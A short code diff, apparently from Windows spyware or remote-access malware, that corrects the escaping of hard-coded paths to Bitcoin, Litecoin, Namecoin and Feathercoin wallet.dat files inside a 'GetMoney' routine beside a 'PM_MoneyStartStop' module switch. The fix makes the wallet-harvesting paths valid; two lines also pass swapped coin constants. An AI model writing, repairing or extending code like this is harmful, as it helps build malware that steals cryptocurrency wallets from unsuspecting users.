@@ -61,10 +61,10 @@ void GetCurrency(WCHAR *currency_path, DWORD type)
 
 void GetMoney()
 {
-	GetCurrency(L"%APPDATA%\Bitcoin\wallet.dat", MONEY_BITCOIN);
-	GetCurrency(L"%APPDATA%\Litecoin\wallet.dat", MONEY_LITECOIN);
-	GetCurrency(L"%APPDATA%\Namecoin\wallet.dat", MONEY_FEATHERCOIN);
-	GetCurrency(L"%APPDATA%\Feathercoin\wallet.dat", MONEY_NAMECOIN);
+	GetCurrency(L"%APPDATA%\\Bitcoin\\wallet.dat", MONEY_BITCOIN);
+	GetCurrency(L"%APPDATA%\\Litecoin\\wallet.dat", MONEY_LITECOIN);
+	GetCurrency(L"%APPDATA%\\Namecoin\\wallet.dat", MONEY_FEATHERCOIN);
+	GetCurrency(L"%APPDATA%\\Feathercoin\\wallet.dat", MONEY_NAMECOIN);
 }
 
 DWORD __stdcall PM_MoneyStartStop(BOOL bStartFlag, BOOL bReset)
